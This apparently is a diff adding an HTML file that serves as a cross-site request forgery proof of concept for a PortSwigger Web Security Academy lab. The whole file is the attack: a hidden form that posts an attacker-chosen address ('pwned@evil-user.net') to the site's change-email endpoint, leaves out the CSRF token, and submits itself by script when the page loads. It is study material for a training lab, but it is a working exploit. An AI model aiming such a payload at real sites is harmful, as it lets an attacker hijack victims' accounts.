@@ -1,0 +1,11 @@
+<html>
+    <body>
+        <form action="https://0a38001f032be3f681633e77002b0047.web-security-academy.net/my-account/change-email" method="POST">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+            <!-- without csrf token -->
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
